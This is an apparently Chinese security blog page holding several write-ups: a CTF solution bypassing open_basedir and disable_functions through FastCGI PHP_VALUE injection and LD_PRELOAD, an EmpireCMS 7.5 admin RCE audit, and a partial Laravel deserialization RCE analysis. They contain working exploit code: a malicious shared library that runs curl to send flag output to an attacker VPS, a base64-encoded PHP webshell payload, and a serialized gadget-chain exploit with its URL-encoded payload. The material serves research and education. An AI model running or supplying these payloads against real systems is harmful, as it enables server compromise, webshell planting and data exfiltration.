        $request .= $this-&gt;buildPacket( self::PARAMS, $paramsRequest, $id );
    }
    $request .= $this-&gt;buildPacket( self::PARAMS, &#39;&#39;, $id );
          if ( $stdin ) {
        $request .= $this-&gt;buildPacket( self::STDIN, $stdin, $id );
    }
    $request .= $this-&gt;buildPacket( self::STDIN, &#39;&#39;, $id );
          if ( fwrite( $this-&gt;_sock, $request ) === false || fflush( $this-&gt;_sock ) === false ) {
        $info = stream_get_meta_data( $this-&gt;_sock );
        if ( $info[&#39;timed_out&#39;] ) {
                  throw new TimedOutException( &#39;Write timed out&#39; );
              }
              // Broken pipe, tear down so future requests might succeed
              fclose( $this-&gt;_sock );
        throw new \Exception( &#39;Failed to write request to socket&#39; );
    }
    $this-&gt;_requests[ $id ] = array(
        &#39;state&#39;    =&gt; self::REQ_STATE_WRITTEN,
        &#39;response&#39; =&gt; null
    );
    return $id;
}
public function wait_for_response( $requestId, $timeoutMs = 0 ) {
    if ( ! isset( $this-&gt;_requests[ $requestId ] ) ) {
        throw new \Exception( &#39;Invalid request id given&#39; );
    }
    if ( $this-&gt;_requests[ $requestId ][&#39;state&#39;] == self::REQ_STATE_OK
         || $this-&gt;_requests[ $requestId ][&#39;state&#39;] == self::REQ_STATE_ERR
    ) {
        return $this-&gt;_requests[ $requestId ][&#39;response&#39;];
    }
    if ( $timeoutMs &gt; 0 ) {
              // Reset timeout on socket for now
              $this-&gt;set_ms_timeout( $timeoutMs );
          } else {
              $timeoutMs = $this-&gt;_readWriteTimeout;
    }
    $startTime = microtime( true );
          do {
              $resp = $this-&gt;readPacket();
              if ( $resp[&#39;type&#39;] == self::STDOUT || $resp[&#39;type&#39;] == self::STDERR ) {
                  if ( $resp[&#39;type&#39;] == self::STDERR ) {
                      $this-&gt;_requests[ $resp[&#39;requestId&#39;] ][&#39;state&#39;] = self::REQ_STATE_ERR;
                  }
                  $this-&gt;_requests[ $resp[&#39;requestId&#39;] ][&#39;response&#39;] .= $resp[&#39;content&#39;];
              }
              if ( $resp[&#39;type&#39;] == self::END_REQUEST ) {
                  $this-&gt;_requests[ $resp[&#39;requestId&#39;] ][&#39;state&#39;] = self::REQ_STATE_OK;
                  if ( $resp[&#39;requestId&#39;] == $requestId ) {
                      break;
                  }
              }
              if ( microtime( true ) - $startTime &gt;= ( $timeoutMs * 1000 ) ) {
                  // Reset
                  $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout );
                  throw new \Exception( &#39;Timed out&#39; );
              }
          } while ( $resp );
    if ( ! is_array( $resp ) ) {
              $info = stream_get_meta_data( $this-&gt;_sock );
              // We must reset timeout but it must be AFTER we get info
              $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout );
              if ( $info[&#39;timed_out&#39;] ) {
                  throw new TimedOutException( &#39;Read timed out&#39; );
              }
              if ( $info[&#39;unread_bytes&#39;] == 0
                   &amp;&amp; $info[&#39;blocked&#39;]
                   &amp;&amp; $info[&#39;eof&#39;] ) {
                  throw new ForbiddenException( &#39;Not in white list. Check listen.allowed_clients.&#39; );
              }
              throw new \Exception( &#39;Read failed&#39; );
          }
          // Reset timeout
          $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout );
          switch ( ord( $resp[&#39;content&#39;]{4} ) ) {
        case self::CANT_MPX_CONN:
            throw new \Exception( &#39;This app can\&#39;t multiplex [CANT_MPX_CONN]&#39; );
            break;
        case self::OVERLOADED:
            throw new \Exception( &#39;New request rejected; too busy [OVERLOADED]&#39; );
            break;
        case self::UNKNOWN_ROLE:
            throw new \Exception( &#39;Role value not known [UNKNOWN_ROLE]&#39; );
            break;
        case self::REQUEST_COMPLETE:
            return $this-&gt;_requests[ $requestId ][&#39;response&#39;];
    }
}
}
$client    = new Client(&quot;unix:///tmp/php-cgi.sock&quot;, -1);
  $php_value = &quot;open_basedir = /&quot;;
$filepath  = &#39;/tmp/readflag.php&#39;;
  $content   = &#39;hpdoger&#39;;
echo $client-&gt;request(
      array(
          &#39;GATEWAY_INTERFACE&#39; =&gt; &#39;FastCGI/1.0&#39;,
          &#39;REQUEST_METHOD&#39;    =&gt; &#39;POST&#39;,
          &#39;SCRIPT_FILENAME&#39;   =&gt; $filepath,
    &#39;SERVER_SOFTWARE&#39;   =&gt; &#39;php/fcgiclient&#39;,
    &#39;REMOTE_ADDR&#39;       =&gt; &#39;127.0.0.1&#39;,
    &#39;REMOTE_PORT&#39;       =&gt; &#39;9985&#39;,
    &#39;SERVER_ADDR&#39;       =&gt; &#39;127.0.0.1&#39;,
    &#39;SERVER_PORT&#39;       =&gt; &#39;80&#39;,
    &#39;SERVER_NAME&#39;       =&gt; &#39;mag-tured&#39;,
    &#39;SERVER_PROTOCOL&#39;   =&gt; &#39;HTTP/1.1&#39;,
    &#39;CONTENT_TYPE&#39;      =&gt; &#39;application/x-www-form-urlencoded&#39;,
    &#39;CONTENT_LENGTH&#39;    =&gt; strlen( $content ),
          &#39;PHP_VALUE&#39;         =&gt; $php_value,
),
$content
);</code></pre><h3 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h3><p>回到这个题目，首先我们找到P神有一篇文章<a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html" target="_blank" rel="noopener">PHP绕过open_basedir列目录的研究</a></p>
<p>上传一个php到/tmp下，包含之后列一下根目录存在哪些文件</p>
<pre><code>copy(&#39;http://vps/log2.txt&#39;,&#39;/tmp/scandir.php&#39;）

*lo2.txt*=&gt;
&lt;?php
$file_list = array();
// normal files
$it = new DirectoryIterator(&quot;glob:///*&quot;);
foreach($it as $f) {
    $file_list[] = $f-&gt;__toString();
}
// special files (starting with a dot(.))
$it = new DirectoryIterator(&quot;glob:///.*&quot;);
foreach($it as $f) {
    $file_list[] = $f-&gt;__toString();
}
sort($file_list);
foreach($file_list as $f){
        echo &quot;{$f}&lt;br/&gt;&quot;;
}
?&gt;</code></pre><p><img src="http://static.zybuluo.com/1160307775/ws7kk6wcaingfbutddk5mbbg/image_1dkalj2gr1c4434273c1geo1a8e64.png" alt="image_1dkalj2gr1c4434273c1geo1a8e64.png-226.6kB"></p>
<p>使用同样的copy方法上传我们的FastCGI脚本，脚本中<code>php_value</code>的值是我们的FastCGI要传给FPM的值用来修改php.ini，并且根据<code>SCRIPT_FILENAME</code>对php文件进行执行<code>/tmp/readflag.php</code>。</p>
<p>同时脚本还要修改的地方，就是使用套接字协议去加载socket。Nginx连接fastcgi的方式有2种：TCP和unix domain socket，脚本使用的即第二种形式。根据不同的php版本，找不同的fastcgi的套接字。在0CTF的题目中，大家用的是php7.2默认的FPM套接字<code>/run/php/php7.3-fpm.sock）</code>，其实FastCGI/FPM套接字都可以用，但是php5的默认</p>
<p>出题人在tmp目录已经给我们FastCGI的套接字<code>/tmp/php-cgi.sock</code>，直接修改脚本</p>
<pre><code>new Client(&quot;unix:///tmp/php-cgi.sock&quot;, -1)</code></pre><p>同时我们还要上传一个readflag.php文件作为脚本的<code>SCRIPT_FILENAME</code>，这里我让FPM为我们加载这样一个php脚本，成功读到readflag程序。但此时我们仍需要bypass disable_functions</p>
<pre><code>&lt;?php
var_dump(file_get_contents(&#39;/readflag&#39;));</code></pre><p><img src="http://static.zybuluo.com/1160307775/xvn7wtzdhnp9r0ouipcrcdbq/image_1dkaqauqt1pud86t1j5rqei74f7e.png" alt="image_1dkaqauqt1pud86t1j5rqei74f7e.png-406.1kB"></p>
<h2 id="Disable-functions的绕过"><a href="#Disable-functions的绕过" class="headerlink" title="Disable_functions的绕过"></a>Disable_functions的绕过</h2><h3 id="FastCGI加载so"><a href="#FastCGI加载so" class="headerlink" title="FastCGI加载so"></a>FastCGI加载so</h3><p>看了下Disable_functions留给我们的有putenv()</p>
<p>关于LD_PRELOAD与putenv也就不过多介绍了，飘零师傅文章写的很详细。大意就是把恶意的so文件加载到环境变量中去执行，而so是我们编译出来的c文件，包含rce的语句，这也是当时0CTF的解题思路。</p>
<p>不过在这道题中，没有安装Imagick，也没有mail函数。但是还有一个函数也会调用sendmail去开进程-&gt;error_log，后面会复现一下error_log的做法。</p>
<p>那么既然putenv()+函数是把so文件加载到环境变量中再去调用，那么我们fastcgi也完全可以做同样的事，只需要更改一下上面脚本的      <code>php_value</code>给ini添加一个extender就行了</p>
<pre><code> $php_value = &quot;allow_url_include = On\nsafe_mode = Off\nopen_basedir = /\nextension_dir = /tmp\nextension = hpdoger.so\n</code></pre><p>编译一个恶意的c文件<code>hpdoger.c</code>，这里直接用网上亘古不变的写法</p>
<pre><code>#define _GNU_SOURCE
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
__attribute__ ((__constructor__)) void preload (void)
{
    system(&quot;curl vps:6666/`/readflag`&quot;);
}</code></pre><p>通过shared命令编译<code>gcc hpdoger.c -fPIC -shared -o hpdoger.so</code>，依然是通过copy命令上传fastcgi.php和hpdoger.so，此时/tmp下应该有这两个文件</p>
<pre><code>copy(&#39;http://vps/hpdoger.so&#39;,&#39;/tmp/hpdoger.so&#39;)</code></pre><p><img src="http://static.zybuluo.com/1160307775/jov8ot2pbsbpyzpaoft92is2/image_1dkatupe71fhkrvopqi1s0a1v5nm.png" alt="image_1dkatupe71fhkrvopqi1s0a1v5nm.png-272kB"></p>
<p>直接包含fastcgi就能加载并调用hpdoger.so-&gt;bypass base_opendir-&gt;rce</p>
<pre><code>find=.*/e%00&amp;replace=include(&#39;/tmp/fastcgi.php&#39;)&amp;id=4184&amp;regex=1`</code></pre><p><img src="http://static.zybuluo.com/1160307775/i53w4nd8brbyxs76jmx8bywu/image_1dkatnc0vgq56a717rh1dff1u7s9.png" alt="image_1dkatnc0vgq56a717rh1dff1u7s9.png-78.4kB"></p>
<h3 id="LD-PRELOAD加载so"><a href="#LD-PRELOAD加载so" class="headerlink" title="LD_PRELOAD加载so"></a>LD_PRELOAD加载so</h3><p>前文提到mail被Disable_functions了，但是mail和error_log都调用了外部进程sendmail。这里编写一个php来调用error_log，然后代码执行包含这个/tmp下的php即可rce</p>
<pre><code>&lt;?php
putenv(&quot;LD_PRELOAD=/tmp/hpdoger.so&quot;);
error_log(&#39;&#39;,1);
?&gt;</code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>自闭点在于本地环境和远程环境真的是两个概念，mac环境gcc编译和ubuntu的gcc编译出来的东西天壤之别..</p>

                
            </div>
            <div class="continue">
            <a href="/2019/09/17/从一道CTF学习Fastcgi绕过姿势/">
            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2019/09/09/帝国(EmpireCMS)7.5的两个后台RCE审计/"> 
                    帝国(EmpireCMS)7.5的两个后台RCE审计 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2019-09-09   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="帝国-EmpireCMS-7-5的两个后台RCE审计"><a href="#帝国-EmpireCMS-7-5的两个后台RCE审计" class="headerlink" title="帝国(EmpireCMS)7.5的两个后台RCE审计"></a>帝国(EmpireCMS)7.5的两个后台RCE审计</h1><p>原文首发于先知：<a href="https://xz.aliyun.com/t/6228" target="_blank" rel="noopener">https://xz.aliyun.com/t/6228</a></p>
<h2 id="后台RCE-增加自定义页面"><a href="#后台RCE-增加自定义页面" class="headerlink" title="后台RCE-增加自定义页面"></a>后台RCE-增加自定义页面</h2><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>这个漏洞挖掘最初来源于qclover师傅:<a href="http://qclover.cn/2018/10/10/EmpireCMS_V7.5%E7%9A%84%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1.html" target="_blank" rel="noopener">EmpireCMS_V7.5的一次审计</a></p>
<p>但是在这篇复现的文章中还是有一些出入的地方，比如说getshell的具体位置和成因。这里重新跟进分析一下</p>
<p>首先看一下getshell的流程，这个洞有点像黑盒to白盒<br><img src="http://static.zybuluo.com/1160307775/2r4ccien35hlqw77mo8hrqzj/image_1dje3gco735q1k5m1f11n071a634r.png" alt="image_1dje3gco735q1k5m1f11n071a634r.png-328kB"></p>
<p>增加页面功能，会在程序根目录生成一个shell.php，访问为phpinfo结果<br><img src="http://static.zybuluo.com/1160307775/2zfoc03cbjv8woa3r5gjme49/image_1djdll0r410dk6ktm7stsgrlm.png" alt="image_1djdll0r410dk6ktm7stsgrlm.png-248.3kB"></p>
<p>但是在我写入其他木马时，例如<code>&lt;?php @eval($_REQUEST[hpdoger]);?&gt;</code>，根目录却生成了一个空的shell.php文件<br><img src="http://static.zybuluo.com/1160307775/48t49l1j0m30otcu25f646zv/image_1djdlqbum1gj217cp2d61d5f1hi613.png" alt="image_1djdlqbum1gj217cp2d61d5f1hi613.png-56.4kB"></p>
<p>此时就有些疑问，推测真正的漏洞点应该不是在根目录写入一个php，应该另有它径，这里分析一下漏洞产生的真正成因。</p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>入口在<code>e/admin/ecmscom.php</code>代码48行，跟进函数<code>AddUserpage</code><br><img src="http://static.zybuluo.com/1160307775/zdc2rmjeup4qfnqr5u9agc3j/image_1djdm53uj1m201n781ncr7ednrr1g.png" alt="image_1djdm53uj1m201n781ncr7ednrr1g.png-431.1kB"></p>
<p>重点关注两个参数的流程:path、pagetext<br><img src="http://static.zybuluo.com/1160307775/w2r7bolvqfafnju4ndirh0al/image_1djdm8m8l6ve645da3es96c51t.png" alt="image_1djdm8m8l6ve645da3es96c51t.png-535.4kB"></p>
<p>步入<code>RepPhpAspJspcode</code>函数</p>
<pre><code>function RepPhpAspJspcode($string){
    global $public_r;
    if(!$public_r[candocode]){
        //$string=str_replace(&quot;&lt;?xml&quot;,&quot;[!--ecms.xml--]&quot;,$string);
        $string=str_replace(&quot;&lt;\\&quot;,&quot;&amp;lt;\\&quot;,$string);
        $string=str_replace(&quot;\\&gt;&quot;,&quot;\\&amp;gt;&quot;,$string);
        $string=str_replace(&quot;&lt;?&quot;,&quot;&amp;lt;?&quot;,$string);
        $string=str_replace(&quot;&lt;%&quot;,&quot;&amp;lt;%&quot;,$string);
        if(@stristr($string,&#39; language&#39;))
        {
            $string=preg_replace(array(&#39;!&lt;script!i&#39;,&#39;!&lt;/script&gt;!i&#39;),array(&#39;&amp;lt;script&#39;,&#39;&amp;lt;/script&amp;gt;&#39;),$string);
        }
        //$string=str_replace(&quot;[!--ecms.xml--]&quot;,&quot;&lt;?xml&quot;,$string);
    }
    return $string;
}</code></pre><p>这个函数用来对pagetext参数进行了php标签的实体化，但是empirecms默认<code>public_r[candocode]</code>为null，所以这里相当于直接返回了原始pagetext的值</p>
<p>继续回到<code>AddUserpage</code>函数，接着步入<code>ReUserpage</code>函数，在e/class/functions.php的4281行<br><img src="http://static.zybuluo.com/1160307775/gyn1d0txofybrwzm1hu39r1a/image_1djdmv7bv17551oir15kv1do5sg42a.png" alt="image_1djdmv7bv17551oir15kv1do5sg42a.png-298.8kB"></p>
<p>获取程序的根路径后拼接传入的path，而后DoFileMKDir在根目录建立了shell.php</p>
<p>接着步入<code>InfoNewsBq</code>函数，也是这个漏洞产生的函数。关键代码在<code>e/class/functions.php</code>的2469-2496行</p>
<p><img src="http://static.zybuluo.com/1160307775/i3ri8ea5z4g4leh18tid1gig/image_1djdnbjo2pelbn91uh11ks21u8p2n.png" alt="image_1djdnbjo2pelbn91uh11ks21u8p2n.png-496.3kB"></p>
<p>$file参数以php结尾，通过<code>WriteFiletext</code>函数向$file中写入上一步的pagetext(这里为$indextext)，而<code>WriteFiletext</code>是没有任何过滤的</p>
<pre><code>function WriteFiletext($filepath,$string){
    global $public_r;
    $string=stripSlashes($string);
    $fp=@fopen($filepath,&quot;w&quot;);
    @fputs($fp,$string);
    @fclose($fp);
    if(empty($public_r[filechmod]))
    {
        @chmod($filepath,0777);
    }
}</code></pre><p>于是在<code>e/data/tmp</code>目录下，以模版文件的形式写入webshell，同时也将AddCheckViewTempCode()返回的权鉴方法写了进去，所以我们不能直接以url的方式访问这个webshell。<br><img src="http://static.zybuluo.com/1160307775/zp17zrn2j1muego2qa7p9din/image_1djdo4l1d1gte63t1qcb1a73aho4e.png" alt="image_1djdo4l1d1gte63t1qcb1a73aho4e.png-278.6kB"></p>
<p>但是仍有方法使这个webshell执行并将结果输出。原因在下面这几行<br><img src="http://static.zybuluo.com/1160307775/ecp2rqbzer4w4xk8lw33ghcz/image_1djdnjf5p1b2p1oan4pqn7bd2434.png" alt="image_1djdnjf5p1b2p1oan4pqn7bd2434.png-564.3kB"></p>
<p>由于入口处定义了常量<code>InEmpireCMS</code>，ob_get_contents可以读取缓冲区的输出，而输出正好是刚才我们包含进去的shell的结果。因此执行了phpinfo()后将要输出到浏览器的内容赋值给了$string变量并返回，在<code>ReUserpage</code>函数中又进行了一次写入，缓冲结果写入的根目录下的shell.php，造成一个表面getshell的现象，其实是一种rce。</p>
<p><img src="http://static.zybuluo.com/1160307775/ceu2e6w6h3a09qkm8krde4sx/image_1djdnpbbj180fdns1d2h1bvd1neu3h.png" alt="image_1djdnpbbj180fdns1d2h1bvd1neu3h.png-355.3kB"></p>
<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>设置<code>$public_r[candocode]</code>为true进行写入内容的过滤</p>
<h2 id="后台首页模版处rce到getshell"><a href="#后台首页模版处rce到getshell" class="headerlink" title="后台首页模版处rce到getshell"></a>后台首页模版处rce到getshell</h2><p>承接上一个漏洞，整个empirecms不少用到ob_get_contents的地方，所以就想挖掘一下还有没有其他可以利用的点，最后把眼光锁在增加模版处。</p>
<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>在后台模版功能处，选择管理首页模版，然后点击增加首页方案<br><img src="http://static.zybuluo.com/1160307775/92bdlk6m16ygken7p4xw18dj/image_1djp1p7ed1g6q1vs61qof19pb7cjm.png" alt="image_1djp1p7ed1g6q1vs61qof19pb7cjm.png-226.2kB"></p>
<p>复制下面的payload，填写到模版内容处，点击提交。</p>
<pre><code>&lt;?php 
$aa = base64_decode(ZWNobyAnPD9waHAgZXZhbCgkX1JFUVVFU1RbaHBdKTsnPnNoZWxsLnBocA);
${(system)($aa)};
?&gt;</code></pre><p><img src="http://static.zybuluo.com/1160307775/86i5w3sopy8hik249iozojxo/image_1djp1rm8v2kc1s6l1f3b1g59cjk1g.png" alt="image_1djp1rm8v2kc1s6l1f3b1g59cjk1g.png-311.9kB"></p>
<p>其中base64编码部分为</p>
<pre><code>ZWNobyAnPD9waHAgZXZhbCgkX1JFUVVFU1RbaHBdKTsnPnNoZWxsLnBocA
=&gt;
echo &#39;&lt;?php eval($_REQUEST[hp]);&#39;&gt;shell.php</code></pre><p>再点击<strong>启用此方案</strong>即可getshell，在<code>e/admin/template/</code>目录下生成shell.php</p>
<p><img src="http://static.zybuluo.com/1160307775/jck0izcors9rxr3b8ydk78gf/image_1djp21du0o250ocp31lnuad21t.png" alt="image_1djp21du0o250ocp31lnuad21t.png-64.3kB"><br><img src="http://static.zybuluo.com/1160307775/jeakcfnhj6ljtu09tq4tcsnu/image_1djp23v55qua1pa11b021uir1qmp2a.png" alt="image_1djp23v55qua1pa11b021uir1qmp2a.png-278.2kB"></p>
<h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在e/class/functions.php的<code>NewsBq</code>函数中调用<code>WriteFiletext</code>函数向/e/data/tmp/index.php中写入文件并包含<br><img src="http://static.zybuluo.com/1160307775/vngxtn93avtnyhl4ix12mndr/image_1djp2kjth3i01l78dg91q3g1lba2n.png" alt="image_1djp2kjth3i01l78dg91q3g1lba2n.png-588.3kB"></p>
<p>查找一下哪些地方调用<code>NewsBq</code>函数，最后锁定在<code>e/admin/template/ListIndexpage.php</code>的<code>DefIndexpage</code>中<br><img src="http://static.zybuluo.com/1160307775/w6dlwq628kgerrrfr67flxfq/image_1djp2t8jo6ej1l7t1ui9t9i734.png" alt="image_1djp2t8jo6ej1l7t1ui9t9i734.png-459.9kB"></p>
<p>首先从库里获取得到<code>$r[temptext]</code>作为参数传入NewsBq，此时<code>$class</code>为null。那么文件内容可控吗？查看一下入库的语句，看看存不存在任意写入，全局搜索<code>enewsindexpage</code></p>
<p>在同文件ListIndexpage.php的第23行到47行，调用insert语句向<code>enewsindexpage</code>中增加数据，关键代码如下</p>
<pre><code>function AddIndexpage($add,$userid,$username){
    global $empire,$dbtbpre;
    if(!$add[tempname]||!$add[temptext])
    {
        printerror(&quot;EmptyIndexpageName&quot;,&quot;history.go(-1)&quot;);
    }
    ...
    $add[tempname]=hRepPostStr($add[tempname],1);
    $add[temptext]=RepPhpAspJspcode($add[temptext]);
    $sql=$empire-&gt;query(&quot;insert into {$dbtbpre}enewsindexpage(tempname,temptext) values(&#39;&quot;.$add[tempname].&quot;&#39;,&#39;&quot;.eaddslashes2($add[temptext]).&quot;&#39;);&quot;);
    ...
}</code></pre><p>调用AddIndexpage的入口为：</p>
<pre><code>$enews=$_POST[&#39;enews&#39;];
if(empty($enews))
{$enews=$_GET[&#39;enews&#39;];}

if($enews==&quot;AddIndexpage&quot;)
{
    AddIndexpage($_POST,$logininid,$loginin);
}</code></pre><p>所以<code>$add</code>为<code>$_POST</code>获取的数组，经过一次<code>eaddslashes2</code>函数清洗后以temptext字段存入库，而<code>eaddslashes2</code>在内部调用的是addslashes。猜想开发者最初可能只是为了防止sql注入，而没有进行其他类型过滤。但是我们执行任意命令是可以绕过addslashes的限制，取出来temptext字段来rce。</p>
<p>只需要用到复杂变量：<a href="https://www.jianshu.com/p/7c818ddc5731" target="_blank" rel="noopener">PHP复杂变量绕过addslashes()直接拿shell</a></p>
<p>整理思路：入库rce语句-&gt;取出库-&gt;写文件-&gt;包含rce-&gt;getshell</p>
<h3 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>对入库语句进行过滤，建议在<code>eaddslashes2</code>中增加一些过滤机制</p>

                
            </div>
            <div class="continue">
            <a href="/2019/09/09/帝国(EmpireCMS)7.5的两个后台RCE审计/">
            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2019/08/25/Laravel由destrcuct引起的两处反序列化RCE分析/"> 
                    Laravel由destrcuct引起的两处反序列化RCE分析 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2019-08-25   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="Laravel由destrcuct引起的两处反序列化RCE分析"><a href="#Laravel由destrcuct引起的两处反序列化RCE分析" class="headerlink" title="Laravel由destrcuct引起的两处反序列化RCE分析"></a>Laravel由destrcuct引起的两处反序列化RCE分析</h1><p>文章首发于安全客:<a href="https://www.anquanke.com/post/id/184541" target="_blank" rel="noopener">https://www.anquanke.com/post/id/184541</a></p>
<p>laravel本身没有反序列化的调用机制，只有依赖于二次开发或者敏感函数才能触发反序列化。在Laravel5.3以后的版本引入<code>Illuminate\Broadcasting\PendingBroadcast.php</code>文件，存在__destrcut魔法函数引发一系列问题。这里我对框架本身能造成rce的点进行分析，一处是三方组件fzaninotto的回调调用<code>call_user_func_array</code>造成的rce，另一处是<br>p神在lumenserial找到laravel核心库的一处任意函数调用。</p>
<h1 id="Laravel自加载组件fzaninotto组件RCE"><a href="#Laravel自加载组件fzaninotto组件RCE" class="headerlink" title="Laravel自加载组件fzaninotto组件RCE"></a>Laravel自加载组件fzaninotto组件RCE</h1><h2 id="版本说明"><a href="#版本说明" class="headerlink" title="版本说明"></a>版本说明</h2><p><code>fzaninotto</code>在laravel 5.1以后composer默认安装<br><img src="http://static.zybuluo.com/1160307775/fc1ugl8qu5rkggox43xanknq/image_1dhoajden1lhl1rrdc1i18qr82s9.png" alt="image_1dhoajden1lhl1rrdc1i18qr82s9.png-164.8kB"></p>
<p><code>autoload_classmap.php</code>可以看到，在进行依赖加载的时候默认将<code>/fzaninotto/faker/src/Faker/Generator.php</code>注册到全局变量<code>$classmap</code>中，在程序调用相关类时遵从PSR4的规范，也就是说我们反序列化是可以调用<code>/fzaninotto/faker/src/Faker/</code>目录下的任何文件。</p>
<p><img src="http://static.zybuluo.com/1160307775/zrpwx3p0q227if3wqkeaucgd/image_1dhoalu3vkne6bp7mf1nfj7qhm.png" alt="image_1dhoalu3vkne6bp7mf1nfj7qhm.png-751.3kB"></p>
<h2 id="适用条件"><a href="#适用条件" class="headerlink" title="适用条件"></a>适用条件</h2><ul>
<li>laravel 5.3-5.8</li>
<li>寻找可控的反序列化点，才能触发该漏洞</li>
</ul>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>本地搭建laravel最新的环境 5.8.29<br><img src="http://static.zybuluo.com/1160307775/n45b5dlbpcdyukkok7h2sezo/image_1dhobbpoc1j5p1toc1rf71rd729l9.png" alt="image_1dhobbpoc1j5p1toc1rf71rd729l9.png-332kB"></p>
<p>构造一个反序列化可控点，在<code>app/Http/Controllers</code>文件夹下创建文件TaskController.php，源码如下:</p>
<pre><code>&lt;?php
namespace App\Http\Controllers;

class TaskController
{
    public function index(){
        unserialize($_GET[&#39;url&#39;]);
    }
}</code></pre><p>在<code>routes/web.php</code>文件中添加这样路由记录</p>
<pre><code>Route::get(&#39;/bug&#39;, &#39;TaskController@index&#39;);</code></pre><p><img src="http://static.zybuluo.com/1160307775/9txqyfac02ns2bq2tp9n9s8c/image_1dhoc20tt1p37lmb30g19m1s1v13.png" alt="image_1dhoc20tt1p37lmb30g19m1s1v13.png-234.4kB"></p>
<h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre><code>&lt;?php
//exp.php
namespace Faker{
    class Generator{
        protected $formatters = array();

        public function __construct($formatters)
        {
            $this-&gt;formatters = $formatters;
        }
    }
}

namespace Illuminate\Broadcasting{
    class PendingBroadcast.php``
    {
        protected $events;
        protected $event;

        public function __construct($events, $event)
        {
            $this-&gt;events = $events;
            $this-&gt;event = $event;
        }

    }
}

namespace{
    $generator = new Faker\Generator(array(&quot;dispatch&quot;=&gt;&quot;system&quot;));
    $PendingBroadcast = new Illuminate\Broadcasting\PendingBroadcast($generator,&quot;id&quot;);
    echo urlencode(serialize($PendingBroadcast));

}</code></pre><p>运行exp.php生成poc，如果环境搭建没有问题，直接请求下面的uri既能看到rce效果</p>
<pre><code>bug?url=O%3A40%3A&quot;Illuminate%5CBroadcasting%5CPendingBroadcast&quot;%3A2%3A%7Bs%3A9%3A&quot;%00%2A%00events&quot;%3BO%3A15%3A&quot;Faker%5CGenerator&quot;%3A1%3A%7Bs%3A13%3A&quot;%00%2A%00formatters&quot;%3Ba%3A1%3A%7Bs%3A8%3A&quot;dispatch&quot;%3Bs%3A6%3A&quot;system&quot;%3B%7D%7Ds%3A8%3A&quot;%00%2A%00event&quot;%3Bs%3A2%3A&quot;id&quot;%3B%7D</code></pre><p><img src="http://static.zybuluo.com/1160307775/ci645ofexwzuhhscrh6ix4bj/image_1dhocrcl7t951nqna0abdu19l71t.png" alt="image_1dhocrcl7t951nqna0abdu19l71t.png-97.7kB"></p>
<h3 id="EXP流程"><a href="#EXP流程" class="headerlink" title="EXP流程"></a>EXP流程</h3><p>在入口设置断点，传入payload<br><img src="http://static.zybuluo.com/1160307775/endgg8ppidelbmgxxi0uj1po/image_1dhod29lhevt1urr1u8j8v1pf32a.png" alt="image_1dhod29lhevt1urr1u8j8v1pf32a.png-239.1kB"></p>
<p>步入<code>Illuminate\Foundation\AliasLoader</code>的load函数，检测要实例的对象是否是laravel注册门面类，这里不满足条件<br><img src="http://static.zybuluo.com/1160307775/nipw8jf21ejjop49p2qvv1ss/image_1dhod50m81hlejqdltvv31ldd2n.png" alt="image_1dhod50m81hlejqdltvv31ldd2n.png-189.3kB"></p>
<p>因此步入<code>Composer\Autoload\ClassLoader</code>查找相应class对应于vendor中的php文件。也就是上文提到的laravel在加载服务容器时会执行的<code>autoload_class</code>作用结果</p>
<p><img src="http://static.zybuluo.com/1160307775/gnp5zqdryec1r1xm0swduzss/image_1dhoh4r22a9ln89upkgff5o53h.png" alt="image_1dhoh4r22a9ln89upkgff5o53h.png-531.1kB"></p>
<p>看到调用栈能够成功读取到<code>Faker\Generato</code>文件，并返回给includefile()</p>
<p>载入文件后步入到了反序列化的入口__destruct函数<br><img src="http://static.zybuluo.com/1160307775/xer6dqy2miqhm9n65n4f6ryi/image_1dhohl8c1b005lhch91ier1sij4o.png" alt="image_1dhohl8c1b005lhch91ier1sij4o.png-261.2kB"></p>
